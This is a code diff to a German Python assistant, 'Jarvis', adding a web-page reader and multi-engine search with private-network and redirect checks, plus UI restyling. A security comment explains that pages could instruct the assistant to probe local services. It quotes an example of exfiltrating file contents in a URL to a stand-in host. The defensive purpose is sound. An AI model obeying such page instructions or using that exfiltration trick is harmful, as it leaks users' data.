@@ -37,6 +37,7 @@ import html
 import imaplib
 import importlib.util
 import io
+import ipaddress
 import json
 import math
 import mimetypes
@@ -47,6 +48,7 @@ import secrets
 import select
 import shutil
 import smtplib
+import socket
 import sqlite3
 import ssl
 import subprocess
@@ -64,6 +66,7 @@ import xml.sax.saxutils
 from base64 import b64encode
 from datetime import datetime, timedelta
 from email.message import EmailMessage
+from html.parser import HTMLParser
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
 from urllib.parse import parse_qs, urlparse
@@ -1124,6 +1127,7 @@ class Recall:
 STANDARD_MODELL = "qwen2.5:3b"
 GRUNDSTOCK = ("notiz_speichern", "gedaechtnis_durchsuchen", "protokoll", "punkte_offen")
 MAX_WERKZEUGE = 10
+ADRESSE_IM_TEXT = re.compile(r"https?://|www\.|\b[\w-]+\.(at|de|com|ch|eu|net|org|info)\b", re.I)
 
 # Werkzeuge, die etwas abschließen oder streichen. Kleine Modelle rufen sie
 # gern "vorsorglich" mit auf (offenen Punkt anlegen -> nebenbei Punkt 1
@@ -1178,6 +1182,8 @@ def werkzeuge_auswaehlen(katalog: list, frage: str, anzahl: int = MAX_WERKZEUGE,
         punkte = sum(2 if w in name.lower() else 1 for w in woerter if w in text)
         if name in benutzt:
             punkte += 3
+        if name == "webseite_lesen" and ADRESSE_IM_TEXT.search(frage or ""):
+            punkte += 10  # eine Adresse im Satz heißt: Seite lesen
         if name in GRUNDSTOCK:
             punkte += 1
         bewertet.append((punkte, -nr, werkzeug))
@@ -1378,7 +1384,8 @@ BEHAUPTUNG = re.compile(
 WERKZEUG_PFLICHT = (
     "Regel ohne Ausnahme: Sollst du etwas speichern, anlegen, eintragen, senden, buchen, "
     "starten oder nachschlagen, rufst du dafür das passende Werkzeug auf. Behaupte nie, "
-    "etwas getan zu haben, ohne dass ein Werkzeug es getan hat.")
+    "etwas getan zu haben, ohne dass ein Werkzeug es getan hat. Ist der Auftrag klar, "
+    "handle sofort ohne Rückfrage. Antworte in höchstens zwei Sätzen.")
 _PAUSE = {}  # Modellname -> Zeitpunkt (monotonic), bis zu dem es pausiert wird
 _FEHLSCHLAEGE = {}  # Modellname -> wie oft hintereinander "Kontingent leer"
 
@@ -3484,7 +3491,7 @@ class Bookkeeping:
                     "fehler": "Ich finde die Bilddatei nicht: %s" % bildpfad}
         if agent is None or not getattr(agent, "einsatzbereit", lambda: False)():
             return {"ok": False,
-                    "fehler": "Ohne Anthropic-Schlüssel kann ich keinen Beleg lesen. "
+                    "fehler": "Ohne eingerichtetes Gehirn kann ich keinen Beleg lesen. "
                               "Bitte zuerst die Einrichtung durchlaufen."}
         try:
             with open(bildpfad, "rb") as datei:
@@ -4457,7 +4464,7 @@ class Akquise:
             return {"ok": False, "fehler": "Die Suche ist nicht verfügbar."}
         if agent is None or not getattr(agent, "einsatzbereit", lambda: False)():
             return {"ok": False,
-                    "fehler": "Ohne Anthropic-Schlüssel kann ich die Treffer nicht "
+                    "fehler": "Ohne eingerichtetes Gehirn kann ich die Treffer nicht "
                               "auswerten."}
 
         branchen = branche.strip() if branche else \
@@ -5191,7 +5198,7 @@ class Routines:
 
         if agent is None or not getattr(agent, "einsatzbereit", lambda: False)():
             return {"ok": False, "name": treffer["name"], "anweisung": treffer["anweisung"],
-                    "fehler": "Ohne Anthropic-Schlüssel kann ich die Routine %s nicht "
+                    "fehler": "Ohne eingerichtetes Gehirn kann ich die Routine %s nicht "
                               "ausführen." % treffer["name"]}
 
         auftrag = ("Führe jetzt die gespeicherte Routine '%s' aus. Das ist die Anweisung:\n\n%s\n\n"
@@ -5746,6 +5753,378 @@ class MCPClient:
 
 
 # =========================================================================
+# netz  -  Netz - Webseiten lesen und im Web suchen, ohne Zusatzprogramme.
+# 
+# Bisher konnte Jarvis Seiten nur über Playwright samt eigenem Chromium lesen
+# und nur mit einem Brave-Schlüssel suchen. Fehlt beides - und auf einem
+# normalen Mac fehlt es -, konnte er gar nichts lesen. Dieses Modul braucht nur
+# Python:
+# 
+# * **Seite lesen**: Die Seite wird geholt und in Klartext zerlegt - Titel,
+#   Überschriften, Absätze, dazu Links, Mailadressen und Telefonnummern.
+#   Skripte, Menüs und Fußzeilen fliegen raus.
+# * **Suchen**: der Reihe nach über den Such-Dienst (falls eingerichtet), die
+#   Google-Suche des Gemini-Schlüssels (falls Kontingent da ist), DuckDuckGo und
+#   Mojeek. Der erste Weg, der Ergebnisse liefert, gewinnt.
+# 
+# **Sicherheit.** Gelesen wird nur http und https, nie eine Adresse im eigenen
+# Netz (127.0.0.1, 192.168.x.x ...). Sonst könnte eine fremde Seite Jarvis
+# anweisen, die eigene Schnittstelle oder den Router abzufragen. Sehr lange
+# Adressen werden abgelehnt: Über die Adresse ließen sich sonst Daten nach
+# draußen schmuggeln ("lies https://fremd.example/?d=<Inhalt einer Datei>").
+# =========================================================================
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+
+
+BROWSER_KENNUNG = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
+                   "(KHTML, like Gecko) Version/17.0 Safari/605.1.15")
+MAX_ADRESSE = 400
+MAX_BYTES = 2 * 1024 * 1024
+MAX_SEITENTEXT = 6000
+
+UEBERSPRINGEN = {"script", "style", "noscript", "svg", "template", "iframe", "canvas",
+                 "nav", "footer", "form", "button", "select", "option"}
+BLOCK = {"p", "div", "section", "article", "main", "li", "tr", "td", "th", "br",
+         "h1", "h2", "h3", "h4", "h5", "h6", "dd", "dt", "blockquote", "pre",
+         "address", "figcaption", "header", "table", "ul", "ol"}
+
+MAIL_MUSTER = re.compile(r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}")
+TELEFON_MUSTER = re.compile(r"(?:\+|00)\d{2}[\d\s/().-]{6,}\d|\b0\d{2,4}[\s/-]?\d[\d\s/-]{4,}\d")
+
+
+class _Zerleger(HTMLParser):
+    """Zerlegt HTML in lesbaren Text, Links und Kontaktdaten."""
+
+    def __init__(self):
+        super().__init__(convert_charrefs=True)
+        self.titel = ""
+        self.beschreibung = ""
+        self.teile = []
+        self.links = []
+        self.mails = set()
+        self.telefone = set()
+        self._tiefe_aus = 0
+        self._im_titel = False
+        self._link = None
+
+    def handle_starttag(self, tag, attrs):
+        werte = dict(attrs)
+        if tag in UEBERSPRINGEN:
+            self._tiefe_aus += 1
+            return
+        if tag == "title":
+            self._im_titel = True
+        elif tag == "meta" and (werte.get("name") or werte.get("property") or "").lower() in (
+                "description", "og:description"):
+            self.beschreibung = self.beschreibung or (werte.get("content") or "").strip()
+        elif tag == "a":
+            ziel = (werte.get("href") or "").strip()
+            if ziel.lower().startswith("mailto:"):
+                self.mails.add(ziel[7:].split("?")[0])
+            elif ziel.lower().startswith("tel:"):
+                self.telefone.add(urllib.parse.unquote(ziel[4:]).strip())
+            elif ziel and not ziel.startswith(("#", "javascript:")):
+                self._link = [ziel, ""]
+        if tag in BLOCK:
+            self.teile.append("\n")
+        if tag in ("h1", "h2", "h3"):
+            self.teile.append("## ")
+
+    def handle_endtag(self, tag):
+        if tag in UEBERSPRINGEN:
+            self._tiefe_aus = max(0, self._tiefe_aus - 1)
+            return
+        if tag == "title":
+            self._im_titel = False
+        elif tag == "a" and self._link is not None:
+            if self._link[1].strip():
+                self.links.append((self._link[0], " ".join(self._link[1].split())[:80]))
+            self._link = None
+        if tag in BLOCK:
+            self.teile.append("\n")
+
+    def handle_data(self, daten):
+        if self._im_titel:
+            self.titel += daten
+            return
+        if self._tiefe_aus:
+            return
+        self.teile.append(daten)
+        if self._link is not None:
+            self._link[1] += daten
+
+    def text(self) -> str:
+        roh = "".join(self.teile)
+        zeilen = []
+        for zeile in roh.split("\n"):
+            zeile = " ".join(zeile.split())
+            if len(zeile) > 1 and (not zeilen or zeilen[-1] != zeile):
+                zeilen.append(zeile)
+        return "\n".join(zeilen)
+
+
+def adresse_pruefen_netz(adresse: str):
+    """Gibt ``(adresse, fehler)`` zurück. Nur http/https, nichts im eigenen Netz."""
+    roh = (adresse or "").strip()
+    if not roh:
+        return None, "Es fehlt die Adresse."
+    if len(roh) > MAX_ADRESSE:
+        return None, "Die Adresse ist ungewöhnlich lang - das öffne ich nicht."
+    if not re.match(r"^[a-z][a-z0-9+.-]*://", roh, re.I):
+        roh = "https://" + roh.lstrip("/")
+    teile = urllib.parse.urlsplit(roh)
+    if teile.scheme.lower() not in ("http", "https") or not teile.hostname:
+        return None, "Ich lese nur Web-Adressen mit http oder https."
+    host = teile.hostname.lower()
+    # Umlaute in Pfad und Domain: so umschreiben, wie Browser es tun.
+    try:
+        netzort = host.encode("idna").decode("ascii")
+    except UnicodeError:
+        return None, "Die Adresse %s ergibt keinen Sinn." % host
+    if teile.port:
+        netzort += ":%d" % teile.port
+    roh = urllib.parse.urlunsplit((
+        teile.scheme.lower(), netzort,
+        urllib.parse.quote(teile.path, safe="/%:@!$&'()*+,;=-._~"),
+        urllib.parse.quote(teile.query, safe="/%:@!$&'()*+,;=-._~?"), ""))
+    if host in ("localhost",) or host.endswith((".local", ".localhost", ".internal")):
+        return None, "Adressen im eigenen Netz lese ich nicht."
+    try:
+        for eintrag in socket.getaddrinfo(host, None):
+            ip = ipaddress.ip_address(eintrag[4][0])
+            if (ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved
+                    or ip.is_multicast or ip.is_unspecified):
+                return None, "Adressen im eigenen Netz lese ich nicht."
+    except (socket.gaierror, ValueError, OSError):
+        return None, "Die Adresse %s gibt es nicht (oder kein Internet)." % host
+    return roh, ""
+
+
+class _GepruefteWeiterleitung(urllib.request.HTTPRedirectHandler):
+    """Prüft jedes Weiterleitungsziel - sonst lenkt eine Seite auf 127.0.0.1 um."""
+
+    def redirect_request(self, anfrage, datei, code, meldung, koepfe, neue_adresse):
+        _, fehler = adresse_pruefen_netz(neue_adresse)
+        if fehler:
+            raise urllib.error.URLError("Weiterleitung abgelehnt: %s" % fehler)
+        return super().redirect_request(anfrage, datei, code, meldung, koepfe, neue_adresse)
+
+
+_OEFFNER = urllib.request.build_opener(_GepruefteWeiterleitung)
+
+
+def _holen_netz(adresse: str, timeout: int = 20) -> dict:
+    anfrage = urllib.request.Request(adresse, headers={
+        "User-Agent": BROWSER_KENNUNG, "Accept-Language": "de-AT,de;q=0.9,en;q=0.6",
+        "Accept": "text/html,application/xhtml+xml,text/plain;q=0.9,*/*;q=0.5"})
+    try:
+        with _OEFFNER.open(anfrage, timeout=timeout) as antwort:
+            typ = antwort.headers.get("Content-Type", "")
+            roh = antwort.read(MAX_BYTES)
+            ziel = antwort.geturl()
+    except urllib.error.HTTPError as fehler:
+        return {"ok": False, "code": fehler.code,
+                "fehler": "Die Seite antwortet mit Fehler %d%s." % (
+                    fehler.code, " - sie lässt automatische Besucher nicht herein"
+                    if fehler.code in (401, 403, 429) else "")}
+    except (urllib.error.URLError, OSError, ValueError) as fehler:
+        return {"ok": False, "code": 0, "fehler": "Die Seite ist nicht erreichbar: %s" % fehler}
+    zeichensatz = "utf-8"
+    treffer = re.search(r"charset=([\w-]+)", typ, re.I) or \
+        re.search(rb'<meta[^>]+charset=["\']?([\w-]+)', roh[:4000], re.I)
+    if treffer:
+        gefunden = treffer.group(1)
+        zeichensatz = gefunden.decode("ascii", "ignore") if isinstance(gefunden, bytes) \
+            else gefunden
+    try:
+        text = roh.decode(zeichensatz, errors="replace")
+    except LookupError:
+        text = roh.decode("utf-8", errors="replace")
+    return {"ok": True, "typ": typ.lower(), "inhalt": text, "adresse": ziel}
+
+
+def seite_zerlegen(quelltext: str, basis: str = "") -> dict:
+    """Macht aus HTML lesbaren Text samt Links und Kontaktdaten."""
+    zerleger = _Zerleger()
+    try:
+        zerleger.feed(quelltext)
+        zerleger.close()
+    except Exception:
+        pass
+    text = zerleger.text()
+    mails = set(zerleger.mails) | set(MAIL_MUSTER.findall(text))
+    mails = sorted(m for m in mails if not m.lower().endswith((".png", ".jpg", ".gif",
+                                                                ".webp", ".svg")))
+    telefone = set(zerleger.telefone)
+    for treffer in TELEFON_MUSTER.findall(text):
+        if 8 <= len(re.sub(r"\D", "", treffer)) <= 15:
+            telefone.add(" ".join(treffer.split()))
+    links, gesehen = [], set()
+    for ziel, beschriftung in zerleger.links:
+        absolut = urllib.parse.urljoin(basis, ziel) if basis else ziel
+        if absolut.startswith("http") and absolut not in gesehen:
+            gesehen.add(absolut)
+            links.append({"text": beschriftung, "adresse": absolut})
+    return {"titel": " ".join(zerleger.titel.split()), "beschreibung": zerleger.beschreibung,
+            "text": text, "links": links, "mails": mails[:10], "telefone": sorted(telefone)[:10]}
+
+
+def webseite_lesen(adresse: str, frage: str = "") -> dict:
+    """Liest eine Webseite und gibt ihren Inhalt als Text zurück."""
+    adresse, fehler = adresse_pruefen_netz(adresse)
+    if fehler:
+        return {"ok": False, "fehler": fehler}
+    geholt = _holen_netz(adresse)
+    if not geholt["ok"]:
+        return {"ok": False, "fehler": geholt["fehler"]}
+    if "pdf" in geholt["typ"]:
+        return {"ok": False, "fehler": "Das ist ein PDF. PDFs aus dem Netz lese ich noch nicht."}
+    if "html" in geholt["typ"] or "<html" in geholt["inhalt"][:2000].lower():
+        teile = seite_zerlegen(geholt["inhalt"], geholt["adresse"])
+    else:
+        teile = {"titel": "", "beschreibung": "", "text": geholt["inhalt"], "links": [],
+                 "mails": sorted(set(MAIL_MUSTER.findall(geholt["inhalt"])))[:10],
+                 "telefone": []}
+    text = teile["text"]
+    frage = (frage or "").strip().lower()
+    if frage and len(text) > MAX_SEITENTEXT:
+        # Bei langen Seiten zuerst die Absätze, in denen die Frage vorkommt.
+        woerter = [w for w in re.findall(r"\w{4,}", frage)]
+        absaetze = text.split("\n")
+        passend = [a for a in absaetze if any(w in a.lower() for w in woerter)]
+        text = "\n".join(passend[:40]) + "\n---\n" + text
+    gekuerzt = len(text) > MAX_SEITENTEXT
+    text = text[:MAX_SEITENTEXT]
+    if not text.strip() and not teile["beschreibung"]:
+        return {"ok": False, "fehler": "Die Seite liefert keinen lesbaren Text - sie baut "
+                                       "sich vermutlich erst im Browser zusammen."}
+    return {"ok": True, "adresse": geholt["adresse"], "titel": teile["titel"],
+            "beschreibung": teile["beschreibung"][:300], "inhalt": text,
+            "gekuerzt": gekuerzt, "mails": teile["mails"], "telefone": teile["telefone"],
+            "links": teile["links"][:25],
+            "text": "Seite gelesen: %s%s" % (teile["titel"] or geholt["adresse"],
+                                             " (gekürzt)" if gekuerzt else "")}
+
+
+# -- Suche ---------------------------------------------------------------------
+
+def _ddg_zerlegen(quelltext: str) -> list:
+    """Treffer aus der HTML-Ansicht von DuckDuckGo."""
+    treffer = []
+    for block in re.findall(r'<div class="result[^"]*results_links.*?</div>\s*</div>',
+                            quelltext, re.S)[:12] or [quelltext]:
+        for ziel, titel in re.findall(r'class="result__a"[^>]*href="([^"]+)"[^>]*>(.*?)</a>',
+                                      block, re.S):
+            auszug = re.search(r'class="result__snippet"[^>]*>(.*?)</a>', block, re.S)
+            if "uddg=" in ziel:
+                ziel = urllib.parse.unquote(re.search(r"uddg=([^&]+)", ziel).group(1))
+            treffer.append({"titel": _ohne_tags(titel), "adresse": html.unescape(ziel),
+                            "auszug": _ohne_tags(auszug.group(1)) if auszug else ""})
+    eindeutig, gesehen = [], set()
+    for eintrag in treffer:
+        if eintrag["adresse"] not in gesehen and eintrag["adresse"].startswith("http"):
+            gesehen.add(eintrag["adresse"])
+            eindeutig.append(eintrag)
+    return eindeutig
+
+
+def _mojeek_zerlegen(quelltext: str) -> list:
+    treffer = []
+    for ziel, titel in re.findall(r'<a class="title" href="([^"]+)"[^>]*>(.*?)</a>',
+                                  quelltext, re.S):
+        treffer.append({"titel": _ohne_tags(titel), "adresse": html.unescape(ziel), "auszug": ""})
+    auszuege = re.findall(r'<p class="s">(.*?)</p>', quelltext, re.S)
+    for eintrag, auszug in zip(treffer, auszuege):
+        eintrag["auszug"] = _ohne_tags(auszug)
+    return treffer
+
+
+def _ohne_tags(text: str) -> str:
+    return " ".join(html.unescape(re.sub(r"<[^>]+>", " ", text or "")).split())
+
+
+def _gemini_suche(frage: str) -> dict:
+    """Google-Suche über den Gemini-Schlüssel, falls einer eingerichtet ist."""
+    if "generativelanguage.googleapis.com" not in (FREIER_DIENST_URL or "") \
+            or not FREIER_DIENST_SCHLUESSEL:
+        return {"ok": False, "fehler": "kein Gemini-Schlüssel"}
+    modell = (FREIER_DIENST_MODELL or "gemini-flash-lite-latest").split(",")[0].strip()
+    nutzlast = {"contents": [{"parts": [{"text": frage + "\nAntworte knapp auf Deutsch, "
+                                                     "mit Namen, Adressen und Nummern, "
+                                                     "soweit gefunden."}]}],
+                "tools": [{"google_search": {}}]}
+    anfrage = urllib.request.Request(
+        "https://generativelanguage.googleapis.com/v1beta/models/%s:generateContent" % modell,
+        data=json.dumps(nutzlast).encode("utf-8"), method="POST",
+        headers={"x-goog-api-key": FREIER_DIENST_SCHLUESSEL,
+                 "Content-Type": "application/json", "User-Agent": "Jarvis/1.0"})
+    try:
+        with urllib.request.urlopen(anfrage, timeout=40) as antwort:
+            daten = json.loads(antwort.read().decode("utf-8"))
+    except (urllib.error.URLError, OSError, ValueError) as fehler:
+        return {"ok": False, "fehler": "Google-Suche: %s" % fehler}
+    if isinstance(daten, list):
+        daten = daten[0] if daten else {}
+    kandidat = (daten.get("candidates") or [{}])[0]
+    text = "".join(t.get("text", "") for t in (kandidat.get("content") or {}).get("parts", []))
+    quellen = [{"titel": (c.get("web") or {}).get("title", ""),
+                "adresse": (c.get("web") or {}).get("uri", ""), "auszug": ""}
+               for c in (kandidat.get("groundingMetadata") or {}).get("groundingChunks", [])]
+    if not text.strip():
+        return {"ok": False, "fehler": "Google-Suche ohne Ergebnis"}
+    return {"ok": True, "weg": "Google (Gemini)", "zusammenfassung": text.strip(),
+            "treffer": quellen[:8]}
+
+
+def websuche(frage: str, anzahl: int = 6, such_mcp=None) -> dict:
+    """Sucht im Web - der erste Weg, der Ergebnisse liefert, gewinnt."""
+    frage = (frage or "").strip()
+    if not frage:
+        return {"ok": False, "fehler": "Sag mir, wonach ich suchen soll."}
+    gruende = []
+    if such_mcp is not None:
+        ergebnis = such_mcp(frage)
+        if ergebnis.get("ok"):
+            return {"ok": True, "weg": "Such-Dienst", "zusammenfassung": ergebnis["text"],
+                    "treffer": []}
+        gruende.append("Such-Dienst: %s" % ergebnis.get("fehler", "")[:60])
+
+    ergebnis = _gemini_suche(frage)
+    if ergebnis.get("ok"):
+        return ergebnis
+    gruende.append(ergebnis.get("fehler", "")[:60])
+
+    for name, adresse, zerlegen in (
+            ("DuckDuckGo", "https://html.duckduckgo.com/html/?q=%s", _ddg_zerlegen),
+            ("Mojeek", "https://www.mojeek.com/search?q=%s", _mojeek_zerlegen)):
+        geholt = _holen_netz(adresse % urllib.parse.quote_plus(frage), timeout=15)
+        if not geholt["ok"]:
+            gruende.append("%s: %s" % (name, geholt["fehler"][:50]))
+            continue
+        treffer = zerlegen(geholt["inhalt"])
+        if treffer:
+            return {"ok": True, "weg": name, "zusammenfassung": "", "treffer": treffer[:anzahl]}
+        gruende.append("%s: keine Treffer (vielleicht gesperrt)" % name)
+    return {"ok": False, "fehler": "Die Suche hat gerade keinen Weg gefunden. " +
+                                   "; ".join(g for g in gruende if g)}
+
+
+def suche_als_text(ergebnis: dict) -> str:
+    """Macht aus einem Suchergebnis einen Text für das Gehirn."""
+    zeilen = []
+    if ergebnis.get("zusammenfassung"):
+        zeilen.append(ergebnis["zusammenfassung"][:3000])
+    for nummer, eintrag in enumerate(ergebnis.get("treffer") or [], 1):
+        zeilen.append("%d. %s - %s%s" % (nummer, eintrag["titel"], eintrag["adresse"],
+                                         ("\n   " + eintrag["auszug"][:240])
+                                         if eintrag.get("auszug") else ""))
+    return "\n".join(zeilen)
+
+
+# =========================================================================
 # world  -  Welt - echtes Wetter und Recherche.
 # 
 # Das Wetter kommt von Open-Meteo: kostenlos, ohne Schlüssel, ohne Anmeldung.
@@ -5779,7 +6158,7 @@ WETTERLAGE = {
 }
 
 
-def _holen(url: str, parameter: dict, timeout: int = 20, versuche: int = 3):
+def _holen_world(url: str, parameter: dict, timeout: int = 20, versuche: int = 3):
     """Holt JSON von einer Adresse.
 
     Ein einzelner Verbindungsabbruch - unterwegs im Auto oder im WLAN eines
@@ -5812,7 +6191,7 @@ class Welt:
 
     def ort_finden(self, ort: str):
         """Übersetzt einen Ortsnamen in Koordinaten."""
-        daten, fehler = _holen(GEO_URL, {"name": ort, "count": 1,
+        daten, fehler = _holen_world(GEO_URL, {"name": ort, "count": 1,
                                          "language": "de", "format": "json"})
         if daten is None:
             return None, fehler
@@ -5832,7 +6211,7 @@ class Welt:
         if koordinaten is None:
             return {"ok": False, "fehler": fehler}
 
-        daten, fehler = _holen(WETTER_URL, {
+        daten, fehler = _holen_world(WETTER_URL, {
             "latitude": koordinaten["breite"], "longitude": koordinaten["laenge"],
             "current": "temperature_2m,weather_code,wind_speed_10m,relative_humidity_2m",
             "daily": "temperature_2m_max,temperature_2m_min,weather_code,"
@@ -5888,20 +6267,25 @@ class Welt:
         return ""
 
     def recherche(self, frage: str) -> dict:
-        """Sucht im Web über den Such-MCP."""
+        """Sucht im Web: Such-Dienst, Google über Gemini, DuckDuckGo, Mojeek.
+
+        Früher ging das nur mit Brave-Schlüssel. Jetzt ist der Such-Dienst nur
+        noch der erste von mehreren Wegen.
+        """
         frage = (frage or "").strip()
         if not frage:
             return {"ok": False, "fehler": "Sag mir, wonach ich suchen soll."}
+        such_mcp = None
         werkzeug = self._such_werkzeug()
-        if not werkzeug:
-            return {"ok": False,
-                    "fehler": "Für die Recherche fehlt der Such-Dienst. In "
-                              "config/mcp_servers.json den Eintrag 'suche' auf "
-                              "\"aus\": false stellen und einen Brave-Schlüssel eintragen."}
-        ergebnis = self.mcp.aufrufen(werkzeug, {"query": frage, "count": 6})
+        if werkzeug:
+            def such_mcp(f):
+                return self.mcp.aufrufen(werkzeug, {"query": f, "count": 6})
+        ergebnis = websuche(frage, 6, such_mcp)
         if not ergebnis.get("ok"):
             return ergebnis
-        return {"ok": True, "frage": frage, "text": ergebnis["text"][:4000]}
+        return {"ok": True, "frage": frage, "weg": ergebnis["weg"],
+                "treffer": ergebnis.get("treffer", []),
+                "text": suche_als_text(ergebnis)[:4000]}
 
     def flug_suchen(self, von: str, nach: str, wann: str = "") -> dict:
         """Sucht Flugverbindungen und nennt sie. Gebucht wird hier nichts."""
@@ -6027,7 +6411,7 @@ Ein Suchergebnis ist noch keine Buchung - sag klar, was du wirklich erreicht
 hast."""
 
 
-def adresse_pruefen(adresse: str):
+def adresse_pruefen_browser(adresse: str):
     """Prüft eine Adresse. Gibt ``(adresse, fehler)`` zurück."""
     roh = (adresse or "").strip()
     if not roh:
@@ -6145,7 +6529,7 @@ class Browser:
 
     def oeffnen(self, adresse: str) -> dict:
         """Öffnet eine Adresse und liest die Seite."""
-        ziel, fehler = adresse_pruefen(adresse)
+        ziel, fehler = adresse_pruefen_browser(adresse)
         if ziel is None:
             return {"ok": False, "fehler": fehler}
         problem = self._starten()
@@ -6801,7 +7185,7 @@ class Bildschirm:
                               "und pillow. Ohne sie läuft alles andere weiter."}
         if self.agent is None or not getattr(self.agent, "einsatzbereit", lambda: False)():
             return {"ok": False,
-                    "fehler": "Ohne Anthropic-Schlüssel kann ich den Bildschirm nicht sehen."}
+                    "fehler": "Ohne eingerichtetes Gehirn kann ich den Bildschirm nicht sehen."}
 
         verlauf = []
         for nummer in range(1, max(1, int(schritte_max)) + 1):
@@ -7426,7 +7810,7 @@ class Team:
         if self.agent is None or not getattr(self.agent, "einsatzbereit",
                                              lambda: False)():
             return {"ok": False,
-                    "fehler": "Ohne Anthropic-Schlüssel kann %s nicht arbeiten."
+                    "fehler": "Ohne eingerichtetes Gehirn kann %s nicht arbeiten."
                               % ROLLEN[schluessel]["name"]}
 
         gedaechtnis = ""
@@ -7574,21 +7958,25 @@ SEITE_HTML = r"""<!DOCTYPE html>
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="theme-color" content="#08090B">
+<meta name="theme-color" content="#03080F">
 <link rel="icon" href="/symbol.svg" type="image/svg+xml">
 <title>Jarvis</title>
 <style>
 :root{
-  --grund:#08090B; --tief:#0A0D14; --panel:#0F1113; --rand:#1C1F23;
-  --rand-hell:#2A3036; --akzent:#E8622C; --kupfer:#F0A882; --text:#F2EFEA;
-  --gedaempft:#A0A6AC; --grau:#7E858C; --gruen:#4CC38A; --rot:#E5484D;
+  --grund:#03080F; --tief:#050D16; --panel:#071420; --rand:#0E2A3C;
+  --rand-hell:#16425C; --akzent:#3AD1FF; --kupfer:#A6ECFF; --text:#E4F7FF;
+  --gedaempft:#8DB4C6; --grau:#5D8799; --gruen:#4CC38A; --rot:#E5484D;
   --sans:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;
   --mono:ui-monospace,"SF Mono",Menlo,monospace;
 }
 *{box-sizing:border-box;margin:0;padding:0}
 html,body{height:100%;overflow:hidden}
 body{
-  background:radial-gradient(ellipse 120% 80% at 50% 120%,#0E1220 0%,var(--grund) 62%);
+  background:
+    radial-gradient(ellipse 70% 55% at 50% 45%,rgba(58,209,255,.10) 0%,transparent 70%),
+    repeating-linear-gradient(0deg,rgba(58,209,255,.035) 0 1px,transparent 1px 44px),
+    repeating-linear-gradient(90deg,rgba(58,209,255,.035) 0 1px,transparent 1px 44px),
+    radial-gradient(ellipse 120% 80% at 50% 120%,#062238 0%,var(--grund) 62%);
   color:var(--text);font-family:var(--sans);-webkit-font-smoothing:antialiased;
   display:flex;flex-direction:column;user-select:none;
 }
@@ -7600,7 +7988,7 @@ button{font-family:inherit;cursor:pointer;border:none;background:none;color:inhe
   flex:none;display:flex;gap:22px;flex-wrap:wrap;align-items:center;
   padding:10px 20px;font-size:11px;letter-spacing:.11em;text-transform:uppercase;
   color:var(--grau);border-bottom:1px solid var(--rand);
-  background:linear-gradient(90deg,rgba(232,98,44,.13),transparent 68%);
+  background:linear-gradient(90deg,rgba(58,209,255,.13),transparent 68%);
 }
 .ticker b{color:var(--akzent);font-weight:600}
 .ticker b.rot{color:var(--rot)}
@@ -7625,23 +8013,26 @@ main{flex:1;display:flex;flex-direction:column;align-items:center;
 .kugel .ring3{inset:19%;opacity:.35}
 .kugel .kern{
   width:42%;height:42%;border-radius:50%;
-  background:radial-gradient(circle at 34% 30%,#F3B593,#D9764B 46%,#A34F2C);
-  box-shadow:0 0 40px -6px rgba(232,98,44,.5);transition:transform .35s,box-shadow .35s;
+  background:radial-gradient(circle,#F4FDFF 0%,#A6ECFF 20%,#3AD1FF 42%,#0B6E99 62%,
+             rgba(6,40,64,.9) 70%);
+  border:2px solid rgba(166,236,255,.55);
+  box-shadow:0 0 40px -2px rgba(58,209,255,.65),inset 0 0 22px rgba(255,255,255,.35);
+  transition:transform .35s,box-shadow .35s;
 }
 .kugel .welle{position:absolute;inset:0;border-radius:50%;border:1px solid var(--akzent);
               opacity:0;pointer-events:none}
 
 /* Zustände */
 body[data-zustand="schlaeft"] .kugel .kern{transform:scale(.82);
-  box-shadow:0 0 26px -10px rgba(232,98,44,.4);filter:saturate(.55)}
-body[data-zustand="wach"] .ring{border-color:rgba(232,98,44,.55)}
+  box-shadow:0 0 26px -10px rgba(58,209,255,.4);filter:saturate(.55)}
+body[data-zustand="wach"] .ring{border-color:rgba(58,209,255,.55)}
 body[data-zustand="wach"] .kugel .kern{transform:scale(1.08);
-  box-shadow:0 0 70px -4px rgba(232,98,44,.75)}
+  box-shadow:0 0 70px -4px rgba(58,209,255,.75)}
 body[data-zustand="wach"] .welle{animation:welle 1.7s ease-out infinite}
 body[data-zustand="wach"] .welle.w2{animation-delay:.55s}
 body[data-zustand="wach"] .welle.w3{animation-delay:1.1s}
 @keyframes welle{0%{opacity:.55;transform:scale(.55)}100%{opacity:0;transform:scale(1.05)}}
-body[data-zustand="denkt"] .ring{border-color:rgba(232,98,44,.45);
+body[data-zustand="denkt"] .ring{border-color:rgba(58,209,255,.45);
   border-top-color:var(--akzent);animation:dreh 1.1s linear infinite}
 body[data-zustand="denkt"] .ring2{animation:dreh 1.6s linear infinite reverse}
 body[data-zustand="denkt"] .ring3{animation:dreh 2.2s linear infinite}
@@ -7650,6 +8041,26 @@ body[data-zustand="spricht"] .kugel .kern{animation:reden .5s ease-in-out infini
 @keyframes reden{from{transform:scale(1)}to{transform:scale(1.16)}}
 body[data-zustand="aus"] .kugel .kern{filter:grayscale(.85) saturate(.3);transform:scale(.75)}
 
+/* HUD: drehende Ringe um den Kern */
+.kugel .hud{position:absolute;inset:-9%;width:118%;height:118%;color:var(--akzent);
+            pointer-events:none;filter:drop-shadow(0 0 6px rgba(58,209,255,.45))}
+.kugel .hud1{animation:dreh 60s linear infinite}
+.kugel .hud2{animation:dreh 34s linear infinite reverse}
+body[data-zustand="denkt"] .kugel .hud1{animation-duration:5s}
+body[data-zustand="denkt"] .kugel .hud2{animation-duration:3.4s}
+body[data-zustand="aus"] .kugel .hud{opacity:.35;filter:none}
+.ring{border-style:dashed}
+.hud-ecke{position:absolute;top:22px;font-family:var(--mono);color:var(--gedaempft);
+          text-transform:uppercase;letter-spacing:.16em;font-size:10px;line-height:1.7}
+.hud-ecke.links{left:26px}
+.hud-ecke.rechts{right:26px;text-align:right}
+.hud-ecke .hud-wert{font-size:30px;letter-spacing:.04em;color:var(--akzent);
+                    text-shadow:0 0 14px rgba(58,209,255,.55);font-weight:300}
+.hud-ecke::before{content:"";display:block;width:42px;height:1px;background:var(--akzent);
